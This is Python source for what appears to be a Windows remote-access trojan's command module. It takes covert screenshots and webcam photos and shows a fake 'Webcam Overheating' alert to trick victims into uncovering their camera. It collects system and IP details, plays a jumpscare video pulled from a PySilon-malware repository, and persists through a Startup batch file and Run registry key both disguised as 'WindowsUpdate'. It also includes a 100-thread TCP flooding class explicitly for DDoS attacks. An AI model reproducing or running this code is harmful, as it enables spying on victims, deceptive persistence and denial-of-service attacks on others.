from plyer import notification
from scipy.io import wavfile
from ffpyplayer.player import MediaPlayer
import pyautogui
import webbrowser
import asyncio
import edge_tts
import platform
import psutil
import re
import socket
import cv2
import os
import winreg as reg
import requests
import ctypes
import threading
import asyncio
import edge_tts
import sounddevice as sd
import numpy as np
import io
import tempfile

class Say:
    def __init__(self):
        self.voice = "en-US-SteffanNeural"

    async def speak(self, text):
        """Plays the generated speech directly from memory without saving a file"""
        with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as temp_audio:
            temp_path = temp_audio.name  # Temporary file path
        
        # Generate speech and save to temporary file
        tts = edge_tts.Communicate(text, self.voice)
        await tts.save(temp_path)

        # Convert MP3 to WAV in memory
        os.system(f'ffmpeg -i {temp_path} -ar 44100 -ac 2 -f wav {temp_path}.wav -y')

        # Read WAV file into memory
        samplerate, data = wavfile.read(f"{temp_path}.wav")

        # Play audio using sounddevice
        sd.play(data, samplerate)
        sd.wait()  # Wait for audio to finish playing

        # Clean up temporary files
        os.remove(temp_path)
        os.remove(f"{temp_path}.wav")

        print("File deleted and played successfully.")

class Command:
    
    @staticmethod
    def change_wallpaper(url: str, path: str):
        try:
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(path, 'wb') as file:
                    for chunk in response.iter_content(1024):
                        file.write(chunk)
                        
                def change_wallpaper(image_path):
                    """Change the desktop wallpaper."""
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
                change_wallpaper(path)
                return "Wallpaper changed successfully!"
            else:
                return "Failed to download the image"
        except Exception:
            return f"Failed to change wallpaper!"
    @staticmethod
    def remove_webcam_cover():
        ctypes.windll.user32.MessageBoxW(
            0, 
            "WARNING: Webcam Overheating Detected!\n\n"
            "An obstruction has been detected on your webcam, causing potential overheating. "
            "To prevent hardware damage, please ensure the lens is uncovered and unobstructed.", 
            "System Alert - Device Safety", 
            0x30 | 0x1
        )
    @staticmethod
    def jumpscare():
        """
        Downloads and plays a jumpscare video with sound.
        """
        username = os.getenv("USERNAME", "Default")
        video_path = fr"C:\Users\{username}\jumpscare.mp4"
        github_url = "https://github.com/mategol/PySilon-malware/blob/main/resources/icons/jumpscare.mp4"
        raw_url = github_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")

        if not os.path.exists(video_path):
            try:
                response = requests.get(raw_url, stream=True)
                if response.status_code == 200:
                    with open(video_path, "wb") as file:
                        for chunk in response.iter_content(chunk_size=8192):
                            file.write(chunk)
                else:
                    return f"Failed to download video. Status code: {response.status_code}"
            except requests.exceptions.RequestException:
                return "Failed to download video."

        cap = cv2.VideoCapture(video_path)
        player = MediaPlayer(video_path)

        if not cap.isOpened():
            return "Failed to open video."

        cv2.namedWindow("JUMPSCARE", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("JUMPSCARE", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

        while cap.isOpened():
            ret, frame = cap.read()
            audio_frame, val = player.get_frame()
            if not ret:
                break
            cv2.imshow("JUMPSCARE", frame)
            if cv2.waitKey(25) & 0xFF == ord('q'):
                break
        
        cap.release()
        cv2.destroyAllWindows()
        return "Jumpscare played successfully."

    @staticmethod
    def display_message(message: str):
        notification.notify(
            title="VoidMessage",
            message=message,
            app_name="Void",
            timeout=3
        )
        return "Message displayed."

    @staticmethod
    def screenshot():
        image = pyautogui.screenshot()
        image.save("screenshot.png")
        return "Screenshot saved as screenshot.png"

    @staticmethod
    def open_browser(url: str):
        webbrowser.open(url)
        return f"Browser opened with URL: {url}"

    @staticmethod
    def take_picture():
        filename = "webcam.png"
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Failed to access webcam."
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(filename, frame)
            result = f"Picture saved as {filename}"
        else:
            result = "Failed to capture image."
        cap.release()
        cv2.destroyAllWindows()
        return result

    @staticmethod
    def systeminfo():
        """
        Gathers and returns system information in a clean, formal format
        without box borders for better readability
        """
        # Gather system information
        full_processor_name = platform.processor()
        processor_name_match = re.search(r"(Intel64|AMD64|ARM64|x86_64)", full_processor_name)
        processor_name = processor_name_match.group(1) if processor_name_match else full_processor_name
        
        os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
        arch_info = platform.architecture()[0]
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(socket.gethostname())
        ram_gb = round(psutil.virtual_memory().total / (1024**3), 2)
        cpu_cores = psutil.cpu_count(logical=True)
        
        # Create data pairs with labels and values
        data_pairs = [
            ("OS", os_info),
            ("Architecture", arch_info),
            ("Processor", processor_name),
            ("Hostname", hostname),
            ("IP Address", ip_address),
            ("RAM", f"{ram_gb} GB"),
            ("CPU Cores", str(cpu_cores))
        ]
        
        # Find the longest label for proper alignment
        max_label_len = max(len(pair[0]) for pair in data_pairs)
        
        # Generate the clean, formal output
        title = "SYSTEM INFORMATION"
        
        # Create a centered title with underline
        header = f"{title.center(max_label_len + 20)}\n"
        header += f"{'-' * 40}\n"
        
        # Create aligned content lines
        content_lines = []
        for label, value in data_pairs:
            padding = max_label_len - len(label)
            content_lines.append(f"{label}{' ' * padding} : {value}")
        
        # Assemble the complete output
        info = header + "\n".join(content_lines)
        
        return f"```\n{info}\n```"
    @staticmethod
    def add_to_startup():
        """
        Adds the current script to system startup using both:
        1. Startup folder method
        2. Registry method
        """
        try:
            # Get current user's startup folder path
            current_user = os.getlogin()
            startup_folder = fr"C:\Users\{current_user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

            # Get the current script's path
            script_path = os.path.abspath(__file__)

            # Method 1: Copy to Startup Folder
            shortcut_name = "windows_update.bat"
            shortcut_path = os.path.join(startup_folder, shortcut_name)
            with open(shortcut_path, "w") as bat_file:
                bat_file.write(f'@echo off\npython "{script_path}"')

            # Method 2: Add to Windows Registry (Run on startup)
            registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_SET_VALUE) as key:
                reg.SetValueEx(key, "WindowsUpdate", 0, reg.REG_SZ, script_path)

            return "Successfully added to startup."
        
        except Exception as e:
            return f"Failed to add to startup: {str(e)}"
        

class DDOS:
    """
    Class for performing DDoS attacks (Distributed Denial of Service)
    """
    
    def __init__(self):
        """Initialize the DDOS attack controller"""
        self.stop_attack = False
        self.threads = []  # FIXED: Added list to track threads

    def start(self, target_ip, target_port):
        """
        Start a DDoS attack against the specified target
        
        Args:
            target_ip (str): The target IP address
            target_port (int): The target port number
        """
        def ddos_attack(target_ip, target_port):
            try:
                # Test connection first
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.close()
                
                # Start the attack
                while not self.stop_attack:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target_ip, target_port))
                        sock.send("VOID".encode())
                        sock.close()
                    except socket.error:
                        continue
            
            except socket.error:
                return "Failed to connect to target."

        # Create and start multiple attack threads
        num_threads = 100
        self.threads = []  # Reset threads list

        for _ in range(num_threads):
            thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port))
            thread.daemon = True  # FIXED: Make threads daemon so they don't prevent program exit
            thread.start()
            self.threads.append(thread)  # Track threads
            
        return f"DDoS attack started against {target_ip}:{target_port} with {num_threads} threads."

    def stop(self):
        """Stop the ongoing DDoS attack"""
        self.stop_attack = True
        # FIXED: Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=0.5)
        return "DDoS attack stopped."